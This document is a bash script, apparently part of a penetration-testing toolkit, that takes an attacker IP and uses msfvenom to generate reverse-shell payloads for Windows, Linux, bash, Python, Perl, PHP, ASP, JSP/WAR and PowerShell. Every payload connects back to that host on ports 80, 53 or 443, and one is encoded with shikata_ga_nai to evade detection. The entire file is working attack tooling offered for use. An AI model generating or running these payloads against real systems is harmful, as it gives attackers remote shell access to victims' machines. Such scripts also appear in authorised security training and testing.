#!/bin/bash

function usage {
    echo "Usage: $0 <ip address>"
}

if [[ -z $1 ]]; then
    usage
    exit 0
fi

IP=$1
PATHX="/root/offsecfw/tmp"

# Windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=80 -f exe -a x86 --platform win -o $PATHX/shell_mtr_win_80.exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=53 -f exe -a x86 --platform win -o $PATHX/shell_mtr_win_53.exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=443 -f exe -a x86 --platform win -o $PATHX/shell_mtr_win_443.exe
msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=443 -f exe -e x86/shikata_ga_nai -a x86 --platform win -b "\x00" > $PATHX/shell_rev_win_443.exe

# Linux -b "\x00"
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$IP LPORT=80 -f elf -a x86 --platform linux -o $PATHX/shell_mtr_linux_80
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$IP LPORT=53 -f elf -a x86 --platform linux -o $PATHX/shell_linux_53
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$IP LPORT=443 -f elf -a x86 --platform linux -o $PATHX/shell_linux_443

# Bash
msfvenom -p cmd/unix/reverse_bash LHOST=$IP LPORT=443 -f raw > $PATHX/shell_bash_443.sh

# Java WAR\JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$IP LPORT=443 -f war > $PATHX/shell_war_443.war
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$IP LPORT=443 -f raw > $PATHX/shell_jsp_443.war

# Python
msfvenom -p cmd/unix/reverse_python LHOST=$IP LPORT=443 -f raw > $PATHX/shell_py_443.py

# Perl
msfvenom -p cmd/unix/reverse_perl LHOST=$IP LPORT=443 -f raw > shell_perl_443.pl

# PHP
msfvenom -p php/meterpreter/reverse_tcp LHOST=$IP LPORT=443 -f raw --platform php -e generic/none -a php -o $PATHX/shell_php_mtr_443.php

# ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=443 -f asp > $PATHX/shell_asp_443.asp

# Powershell
msfvenom -p cmd/windows/powershell_reverse_tcp LHOST=$IP LPORT=53 > $PATHX/shell_powershell_53.bat
